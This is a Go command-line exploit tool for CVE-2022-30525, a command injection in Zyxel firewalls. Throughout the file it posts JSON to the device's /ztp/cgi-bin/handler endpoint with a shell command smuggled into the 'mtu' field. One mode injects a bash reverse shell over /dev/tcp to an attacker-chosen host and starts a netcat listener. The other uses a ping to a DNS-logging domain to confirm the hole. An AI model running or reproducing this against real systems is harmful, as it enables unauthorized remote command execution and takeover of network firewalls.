package main

import (
	"CVE-2022-30525/dnslog"
	"fmt"
	"github.com/imroc/req/v3"
	"github.com/urfave/cli/v2"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

type Args struct {
	RHost    string
	RPort    int
	LHost    string
	LPort    int
	Protocol string
	NcPath   string
}

func main() {
	var args Args
	app := &cli.App{
		Name:  "CVE-2022-30525",
		Usage: "Zyxel Firewall Command Injection (CVE-2022-30525)",
		Commands: []*cli.Command{
			{
				Name:  "nc",
				Usage: "use netcat listener",
				Flags: []cli.Flag{
					&cli.StringFlag{Name: "rhost", Usage: "The remote address to exploit", Required: true, Destination: &args.RHost},
					&cli.IntFlag{Name: "rport", Usage: "The remote port to exploit", DefaultText: "443", Destination: &args.RPort},
					&cli.StringFlag{Name: "lhost", Usage: "The local address to connect back to", Required: true, Destination: &args.LHost},
					&cli.IntFlag{Name: "lport", Usage: "The local port to connect back to", DefaultText: "1270", Destination: &args.LPort},
					&cli.StringFlag{Name: "protocol", Usage: "The protocol handler to use", DefaultText: "https://", Destination: &args.Protocol},
					&cli.StringFlag{Name: "ncpath", Usage: "The path to nc", DefaultText: "/usr/bin/nc", Destination: &args.NcPath},
				},
				Action: func(c *cli.Context) error {
					bash_exploit := fmt.Sprintf(";bash -c 'exec bash -i &>/dev/tcp/%s/%d <&1';", args.LHost, args.LPort)
					client := req.C()
					request := client.R()
					headers := map[string]string{
						"Content-Type": "application/json; charset=utf-8",
					}
					payload := map[string]string{
						"command":     "setWanPortSt",
						"proto":       "dhcp",
						"port":        "1270",
						"vlan_tagged": "1270",
						"vlanid":      "1270",
						"mtu":         bash_exploit,
						"data":        "",
					}
					targetURL := fmt.Sprintf("%s%s:%d/ztp/cgi-bin/handler", args.Protocol, args.RHost, args.RPort)
					request.SetHeaders(headers)
					request.SetBodyJsonMarshal(payload)
					resp, err := request.Post(targetURL)
					if err != nil {
						fmt.Println(err)
						os.Exit(0)
					}
					if resp.StatusCode != 503 {
						fmt.Println("[-] Exploit failed.")
						os.Exit(0)
					}
					fmt.Println("[+] Executing netcat listener")
					fmt.Println("[+] Using ", args.NcPath)
					cmd := exec.Command(args.NcPath, fmt.Sprintf("-lvnp %d", args.LPort))
					_ = cmd.Run()
					return nil
				},
			},
			{
				Name:    "dnslog",
				Aliases: []string{"d"},
				Usage:   "USE DNSLog",
				Action: func(c *cli.Context) error {
					UseDnsLog(c.Args().First())
					return nil
				},
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}

}

// UseDnsLog 使用dnslog 反连
func UseDnsLog(addrUrl string) {
	targetURL := addrUrl + "/ztp/cgi-bin/handler"
	rdomain := dnslog.Get()
	client := req.C()
	request := client.R()
	headers := map[string]string{
		"Content-Type": "application/json; charset=utf-8",
	}
	payload := map[string]string{
		"command":     "setWanPortSt",
		"proto":       "dhcp",
		"port":        "4",
		"vlan_tagged": "1",
		"vlanid":      "5",
		"mtu":         "ping " + rdomain,
		"data":        "",
	}
	request.SetHeaders(headers)
	request.SetBodyJsonMarshal(payload)
	resp, err := request.Post(targetURL)
	if err != nil {
		fmt.Println(err)
		return
	}
	time.Sleep(time.Second * 5)
	data := dnslog.GetData()
	if strings.Contains(data, rdomain) {
		fmt.Println("[+] Exploit Successful", resp.Request.URL.String())
	} else {
		fmt.Println("[-] Exploit Failed")
	}
}
